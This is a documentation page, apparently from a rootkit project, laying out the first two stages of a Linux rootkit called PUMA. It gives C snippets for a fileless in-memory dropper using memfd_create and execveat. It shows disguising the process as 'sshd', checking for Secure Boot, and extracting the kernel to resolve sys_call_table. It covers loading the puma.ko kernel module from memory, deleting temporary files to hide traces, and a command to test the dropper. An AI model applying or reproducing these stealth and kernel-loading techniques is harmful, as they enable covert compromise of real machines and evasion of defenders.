---
title: "Fileless Dropper & Rootkit Loader"
description: "Stages 1 & 2: in-memory payload staging and LKM insertion"
icon: "cloud_download"
date: "2025-05-11T18:15:00+01:00"
lastmod: "2025-05-11T18:15:00+01:00"
draft: false
toc: true
weight: 10
---

# Stage 1: Fileless Memfd Dropper

{{< alert context="info" text="We stage both loader and cron stub entirely in memory--no on-disk binaries." />}}

1. We call  
   ```c
   fd_loader = memfd_create("loader", MFD_CLOEXEC);
   fd_target = memfd_create("target", MFD_CLOEXEC);
   ```
   to get two anonymous file descriptors.
2. We `write()` our embedded ELF blobs into each fd.
3. We `fork()`:
   - **Child**: redirect stdout/stderr to `/dev/null`, then
     ```c
     execveat(fd_loader, NULL, argv_loader, envp, AT_EMPTY_PATH);
     ```
   - **Parent**: `waitpid()`, then
     ```c
     execveat(fd_target, NULL, argv_target, envp, AT_EMPTY_PATH);
     ```


`execveat(..., AT_EMPTY_PATH)` lets us execute a program by FD without any filename on disk.

---

# Stage 2: Environment-Aware Loader

{{< alert context="warning" text="We verify Secure Boot is off, extract the kernel image, resolve symbols, and then insert our LKM." />}}

1. We rename our process to "sshd" via  
   ```c
   prctl(PR_SET_NAME, "sshd", 0, 0, 0);
   ```
2. We scan `dmesg` for "Secure boot" strings. If found, we abort.
3. We drop a helper script `/tmp/loader.sh` that:
   - Uses `file` + `grep` to detect gzip/xz/bz2/lz4/zstd.
   - Runs `tail -c +<offset>` + the right decompressor → `/tmp/vmlinux`.
4. In `loader.c`, we open `/tmp/vmlinux` and call:
   ```c
   sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
   ```
5. We load our kernel module by creating another memfd for `puma.ko` and calling:
   ```c
   finit_module(fd_puma_ko, "", 0);
   ```
6. Finally, we remove `/tmp/loader.sh` and `/tmp/vmlinux`.

---

## Code Locations

- `rootkit/dropper/dropper.c`  
- `rootkit/loader/loader.c` & `rootkit/loader/loader.sh`

## Quick Test

```bash
./rootkit/dropper/cron
dmesg | grep "PUMA is compatible"
dmesg | grep "PUMA loaded"
```